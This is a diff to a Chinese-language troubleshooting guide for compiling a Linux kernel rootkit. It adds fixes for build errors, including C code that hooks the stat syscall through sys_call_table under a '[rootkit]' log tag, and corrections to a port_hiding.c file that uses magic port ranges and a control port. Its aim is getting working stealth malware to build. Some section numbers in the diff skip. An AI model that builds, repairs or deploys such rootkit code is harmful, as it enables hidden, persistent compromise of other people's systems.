@@ -83,7 +83,48 @@ error: 'original_proc_modules_fops' undeclared (first use in this function)
 #endif
 ```
 
-### 5. 内核头文件未找到
+### 5. __NR_newfstat系统调用号未定义
+
+**错误信息**:
+```
+error: '__NR_newfstat' undeclared (first use in this function)
+```
+
+**解决方案**:
+在Linux内核5.15及更高版本中，`__NR_newfstat` 被替换为 `__NR_fstat`。需要添加条件编译:
+```c
+#ifdef __NR_newfstat
+    original_stat = (void *)sys_call_table[__NR_newfstat];
+#elif defined(__NR_fstat)
+    original_stat = (void *)sys_call_table[__NR_fstat];
+#else
+    original_stat = NULL;
+    printk(KERN_WARNING "[rootkit] stat syscall not available\n");
+#endif
+```
+
+## 7. port_hiding.c函数重定义和宏未定义错误
+
+**错误信息**:
+```
+port_hiding.c:82:12: error: redefinition of 'is_magic_port'
+port_hiding.c:84:26: error: 'MAGIC_PORT_RANGE_START' undeclared
+port_hiding.c:89:50: error: 'ROOTKIT_PORT' undeclared
+```
+
+**原因**: 
+1. `is_magic_port` 函数在 `rootkit.h` 中已定义，在 `port_hiding.c` 中重复定义
+2. 使用了未在 `rootkit.h` 中定义的宏 `MAGIC_PORT_RANGE_START`、`MAGIC_PORT_RANGE_END`、`ROOTKIT_PORT`
+
+**解决方案**:
+1. 删除 `port_hiding.c` 中重复的 `is_magic_port` 函数定义
+2. 将未定义的宏替换为已定义的宏：
+   - `MAGIC_PORT_RANGE_START` → `MAGIC_PORT_START`
+   - `MAGIC_PORT_RANGE_END` → `MAGIC_PORT_END`
+   - `ROOTKIT_PORT` → `CONTROL_PORT`
+3. 修正函数调用参数类型：`is_magic_port(ntohs(port))`
+
+## 8. 内核头文件未找到
 
 **错误信息**:
 ```
@@ -106,7 +147,7 @@ sudo dnf install kernel-devel kernel-headers
 sudo pacman -S linux-headers
 ```
 
-### 6. 编译器版本不匹配警告
+## 9. 编译器版本不匹配警告
 
 **警告信息**:
 ```
@@ -125,7 +166,7 @@ sudo apt install gcc-11  # 根据内核编译版本调整
 make EXTRA_CFLAGS="-w"
 ```
 
-### 7. 循环依赖警告
+## 10. 循环依赖警告
 
 **警告信息**:
 ```
